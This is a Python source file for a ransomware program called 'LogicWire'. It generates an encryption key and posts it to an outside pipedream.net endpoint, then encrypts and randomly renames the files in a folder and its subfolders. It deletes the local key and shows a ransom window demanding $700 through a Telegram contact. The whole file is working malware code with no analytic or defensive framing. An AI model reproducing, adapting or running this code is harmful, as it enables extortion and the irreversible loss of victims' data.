from cryptography.fernet import Fernet
from tkinter import *
import webbrowser
import os
import glob
import random
import string
import requests
import urllib.request
import tempfile
import shutil

def main():
    new = 1
    btcurl = "https://buy.moonpay.io"
    tgmurl = "https://t.me/z01youl"
    window = Tk()
    url = 'https://icon-icons.com/downloadimage.php?id=76799&root=1061/ICO/512/&file=pirate_icon-icons.com_76799.ico'
    urllib.request.urlretrieve(url, 'ico.ico')
    window.wm_iconbitmap('ico.ico')
    window.title("LogicWire")
    window.geometry('1100x700')
    window.configure(bg='black')
    lbl = Label(window, text="LogicWire", font=("Arial Bold", 50), foreground="red", background="black")
    lbl.config(anchor=CENTER)
    lbl.pack()
    lbl = Label(window, text="", font=("Arial Bold", 20), foreground="red", background="black")
    lbl.config(anchor=CENTER)
    lbl.pack()
    message = """
    All your files have been encrypted due to a security problem with your PC. 
    If you want to restore them, write us to our Telegram profil by clicking on the "Contact" button.
    Then i will show you how to pay the amount of 700$.
    """
    lbl = Label(window, text=message, font=("Arial Bold", 10), foreground="white", background="black")
    lbl.config(anchor=CENTER)
    lbl.pack()
    message2 = """
        Attention
    
        Do not rename encrypted files.
        Do not try to decrypt your data using third party software, it may cause permanent data loss.
        Decryption of your files with the help of third parties may cause increased price (they add their fee to our) or you can become a victim of a scam.
        """
    attention = Label(window, text=message2, font=("Arial Bold", 10), foreground="white", background="red")
    attention.config(anchor=CENTER)
    attention.pack()
    lbl2 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
    lbl2.config(anchor=CENTER)
    lbl2.pack()
    ln = Label(text="", bg="black")
    ln.config(anchor=CENTER)
    ln.pack()
    lbl3 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
    lbl3.config(anchor=CENTER)
    lbl3.pack()

    def btcaddress():
        webbrowser.open(btcurl, new=new)
    def telegramtag():
        webbrowser.open(tgmurl, new=new)

    btn = Button(window, text="Pay", command=btcaddress)
    btn.config(anchor=CENTER)
    btn.pack()
    ln2 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
    ln2.config(anchor=CENTER)
    ln2.pack()
    btn2 = Button(window, text="Contact", command=telegramtag)
    btn2.config(anchor=CENTER)
    btn2.pack()
    window.mainloop()

def write_key():
    """
    Générer la clé
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

    with open("key.key", "rb") as key_file:
        key = key_file.read()

    r = requests.post("https://enoec5erdnbzawd.m.pipedream.net", data={"key": key}, headers={'Content - Type': 'application / json'})

def load_key():
    """
    Charge la clé
    """
    return open("key.key", "rb").read()

def kill_key():
    os.remove("key.key")

def nodoublencryption():
    tmp = str(tempfile.gettempdir())
    signature = "cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp"
    path = os.path.dirname(os.path.abspath(signature))
    tmp_files = []
    for root, dirs, files in os.walk(tmp):
        for file in files:
            tmp_files.append(file)

    if signature in tmp_files:
        main()
    else:
        file = open("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp", "w").write("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5")
        shutil.move(path + "\\" + signature, tmp + "\\" + signature)
        write_key()
        key = load_key()
        dir = "fichiers"
        encrypt(dir, key)
        kill_key()
        main()

def encrypt(dir, key):
    f = Fernet(key)
    for filename in glob.glob(os.path.join(dir, '*.*'), recursive=True):
        with open(filename, "rb") as file:
            file_data = file.read()
            encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as new:
            new.write(encrypted_data)

        extension = str(filename).split(".")[1]
        name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
        os.rename(filename, dir + "/" + name + "." + extension)

    subdirs = [os.path.join(dir, o) for o in os.listdir(dir) if os.path.isdir(os.path.join(dir, o))]
    for dirdir in subdirs:
        for filename in glob.glob(os.path.join(dirdir, '*.*'), recursive=True):
            with open(filename, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)
            with open(filename, "wb") as new:
                new.write(encrypted_data)

            extension = str(filename).split(".")[1]
            name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
            os.rename(filename, dirdir + "/" + name + "." + extension)

nodoublencryption()
